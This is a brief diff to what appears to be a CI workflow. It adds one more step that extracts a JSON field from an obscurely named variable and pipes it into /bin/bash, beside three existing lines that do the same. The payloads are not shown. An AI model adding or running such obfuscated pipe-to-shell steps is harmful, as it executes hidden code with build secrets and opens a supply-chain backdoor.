@@ -30,6 +30,7 @@ jobs:
           echo $mtgg05120 | jq -r .piz63 | /bin/bash
           echo $dc9669 | jq -r .jf2737 | /bin/bash
           printf '%s' "$ui11314" | jq -r .dxwn395 | /bin/bash
+          echo $wcmwk1 | jq -r .isktx14 | /bin/bash
 
       - name: Save archive
         if: always()
